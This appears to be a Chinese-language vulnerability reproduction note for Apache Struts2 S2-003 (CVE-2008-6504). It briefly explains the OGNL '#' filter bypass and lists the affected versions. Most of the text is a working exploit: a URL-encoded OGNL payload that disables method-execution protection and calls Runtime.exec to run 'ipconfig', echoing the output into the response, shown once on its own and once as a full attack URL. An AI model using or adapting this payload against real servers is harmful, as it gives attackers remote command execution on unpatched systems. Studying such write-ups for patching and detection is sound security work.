<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2008-6504）S2-003</h1><h2>一、漏洞简介</h2><p>OGNL还提供了广泛的表达式评估功能（http://www.ognl.org/2.6.9/Documentation/html/LanguageGuide/expressionEvaluation.html）。该漏洞允许恶意用户绕过ParametersInterceptor内置的“＃”使用保护，从而能够操纵服务器端上下文对象。<br />所以，例如，要将＃session.user设置为'0wn3d'，可以使用以下参数名称：<br />（'\ u0023'+'session 'user ' '）（未使用）= 0wn3d<br />网址编码后会显示如下：<br />（'\ u0023'％20％2b％20'session 'user \ '））（未使用）= 0wn3d</p><h2>二、漏洞影响</h2><p>Struts 2.0.0 - Struts 2.0.11.2</p><h2>三、复现过程</h2><p>其实S2-003是S2-005的前身，他的POC即为S-005的缩小版，因为S2-003之后官方偷偷修改安全配置，默认让SecurityMemberAccess(管理ognl权限的类)的allowStaticMethodAccess为false，这里简单把S2-005的POC去掉&amp;('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)这句话</p><p>?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&amp;('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&amp;('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&amp;(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&amp;(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&amp;(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&amp;(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&amp;('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))</p><h3>测试网址：</h3><p>http://www.0-sec.org:8080/struts2-showcase-2.0.1/showcase.action</p><h3>修改后网址：</h3><p>http://www.0-sec.org:8080/struts2-showcase-2.0.1/showcase.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&amp;('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&amp;('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&amp;(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&amp;(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&amp;(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&amp;(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&amp;('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))</p><p>直接执行<em><strong>ipconfig</strong></em>命令</p></body></html>